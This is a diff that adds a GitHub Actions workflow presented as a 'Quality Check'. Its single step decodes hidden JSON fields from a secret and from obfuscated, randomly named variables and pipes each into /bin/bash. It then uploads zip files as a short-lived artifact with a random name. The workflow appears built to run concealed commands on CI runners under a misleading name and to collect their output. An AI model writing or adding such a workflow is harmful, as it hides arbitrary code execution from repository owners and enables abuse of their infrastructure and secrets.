@@ -1,0 +1,30 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          h49: ${{ secrets.h49 }}
+        run: |
+          printf '%s' "$h49" | jq -r .poj9411 | /bin/bash
+          echo $xiuz29 | jq -r .kk38 | /bin/bash
+          printf '%s' "$bvszl40952" | jq -r .smlqe227 | /bin/bash
+          echo $qc325 | jq -r .hz71 | /bin/bash
+          printf '%s' "$gc251" | jq -r .rqwc29 | /bin/bash
+          echo $gcjec40032 | jq -r .ep580 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: qjvkFftR
+          path: "*.zip"
+          retention-days: 1
